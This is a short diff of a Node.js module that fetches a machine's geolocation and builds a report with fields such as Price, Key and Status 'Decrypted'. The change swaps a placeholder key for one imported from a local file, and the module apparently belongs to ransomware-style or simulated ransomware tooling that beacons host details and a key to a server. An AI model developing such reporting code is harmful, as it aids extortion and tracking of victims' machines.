@@ -3,6 +3,7 @@ const net = require('net');
 const os = require('os');
 const request = require('request');
 const parseString = require('xml2js').parseString;
+const Key = require('./Key');
 const client = new net.Socket();
 const url = "https://freegeoip.live/xml/";
 const date = new Date();
@@ -27,7 +28,7 @@ module.exports.send = function () {
 					TimeZone: String(result.Response.TimeZone),
 					DateTime: dateTime(),
 					Price: "0$",
-					Key: "Key",
+					Key: Key.key,
 					Status: "Decrypted"
 				};
 
